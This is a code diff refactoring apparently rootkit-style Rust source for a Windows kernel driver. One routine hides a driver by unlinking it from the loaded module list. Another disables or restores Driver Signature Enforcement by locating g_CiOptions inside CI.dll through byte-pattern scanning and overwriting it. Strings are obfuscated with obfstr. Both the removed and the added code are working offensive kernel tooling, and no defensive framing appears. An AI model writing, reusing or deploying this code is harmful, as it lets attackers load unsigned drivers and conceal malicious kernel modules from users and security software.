@@ -1,21 +1,12 @@
 use {
-    obfstr::obfstr,
-    spin::{mutex::Mutex, lazy::Lazy},
-    ntapi::ntldr::LDR_DATA_TABLE_ENTRY,
-    core::sync::atomic::{AtomicPtr, Ordering}, 
-    alloc::{string::String, vec::Vec, boxed::Box},
-    crate::utils::{address::{get_function_address, get_module_base_address}, uni}, 
-    shared::{
+    crate::utils::{address::{get_function_address, get_module_base_address}, patterns::scan_for_pattern, uni}, alloc::{boxed::Box, string::String, vec::Vec}, core::sync::atomic::{AtomicPtr, Ordering}, ntapi::ntldr::LDR_DATA_TABLE_ENTRY, obfstr::obfstr, shared::{
         structs::{
-            DriverInfo, DSE, HiddenDriverInfo, LIST_ENTRY,
-            TargetDriver
+            DriverInfo, HiddenDriverInfo, TargetDriver, DSE, LIST_ENTRY
         }, 
         vars::MAX_DRIVER
-    },
-    wdk_sys::{
-        ntddk::MmGetSystemRoutineAddress, STATUS_INVALID_PARAMETER, 
-        NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL,
-    }, 
+    }, spin::{lazy::Lazy, mutex::Mutex}, wdk_sys::{
+        ntddk::MmGetSystemRoutineAddress, NTSTATUS, STATUS_INVALID_PARAMETER, STATUS_SUCCESS, STATUS_UNSUCCESSFUL
+    } 
 };
 
 pub mod ioctls;
@@ -36,13 +27,11 @@ impl Driver {
     ///
     pub unsafe fn driver_toggle(driver: *mut TargetDriver) -> NTSTATUS {
         let name = &(*driver).name;
-        let status = if (*driver).enable {
+        if (*driver).enable {
             Self::hide_driver(name)
         } else {
             Self::unhide_driver(name)
-        };
-        
-        status
+        }
     }
 
     /// Hides the driver by unlinking it from the loaded module list.
@@ -110,10 +99,10 @@ impl Driver {
     /// # Return
     /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
     ///
-    unsafe fn unhide_driver(driver_name: &String) -> NTSTATUS {
+    unsafe fn unhide_driver(driver_name: &str) -> NTSTATUS {
         let mut driver_info = DRIVER_INFO_HIDE.lock();
 
-        if let Some(index) = driver_info.iter().position(|p| p.name == driver_name.as_str()) {
+        if let Some(index) = driver_info.iter().position(|p| p.name == driver_name) {
             let driver = &driver_info[index];
             let list_entry = driver.list_entry.load(Ordering::SeqCst);
             if list_entry.is_null() {
@@ -198,43 +187,19 @@ impl Driver {
     pub unsafe fn set_dse_state(info_dse: *mut DSE) -> Result<(), NTSTATUS> {
         let module_address = get_module_base_address(obfstr!("CI.dll")).ok_or(STATUS_UNSUCCESSFUL)?;
         let function_address = get_function_address(obfstr!("CiInitialize"), module_address).ok_or(STATUS_UNSUCCESSFUL)?;
-        let function_bytes = core::slice::from_raw_parts(function_address as *const u8, 0x89);
 
         // mov ecx,ebp
         let instructions = [0x8B, 0xCD];
+        let c_ip_initialize = scan_for_pattern(function_address, &instructions, 3, 7, 0x89, i32::from_le_bytes).ok_or(STATUS_UNSUCCESSFUL)?;
 
-        if let Some(y) = function_bytes.windows(instructions.len()).position(|x| *x == instructions) {
-            let position = y + 3;
-            let offset = function_bytes[position..position + 4]
-                .try_into()
-                .map(u32::from_le_bytes)
-                .expect("Slice length is not 4, cannot convert");
-        
-            let new_base = function_address.cast::<u8>().offset((position + 4) as isize);
-            let c_ip_initialize = new_base.cast::<u8>().offset(offset as isize);
+        // mov rbp,r9
+        let instructions = [0x49, 0x8b, 0xE9];
+        let g_ci_options = scan_for_pattern(c_ip_initialize as _, &instructions, 5, 9, 0x21, i32::from_le_bytes).ok_or(STATUS_UNSUCCESSFUL)?;
 
-            // mov rbp,r9
-            let instructions = [0x49, 0x8b, 0xE9];
-
-            let c_ip_initialize_slice = core::slice::from_raw_parts(c_ip_initialize as *const u8, 0x21);
-
-            if let Some(i) = c_ip_initialize_slice.windows(instructions.len()).position(|windows| *windows == instructions) {
-                let position = i + 5;
-                let offset = c_ip_initialize_slice[position..position + 4]
-                    .try_into()
-                    .map(u32::from_le_bytes)
-                    .expect("Slice length is not 4, cannot convert");
-
-                let new_offset = 0xffffffff00000000 + offset as u64;
-                let new_base = c_ip_initialize.cast::<u8>().offset((position + 4) as isize);
-                let g_ci_options = new_base.cast::<u8>().offset(new_offset as isize);
-
-                if (*info_dse).enable {
-                    *(g_ci_options as *mut u64) = 0x0006 as u64;
-                } else {
-                    *(g_ci_options as *mut u64) = 0x000E as u64;
-                }
-            }
+        if (*info_dse).enable {
+            *(g_ci_options as *mut u64) = 0x0006_u64;
+        } else {
+            *(g_ci_options as *mut u64) = 0x000E_u64;
         }
 
         Ok(())
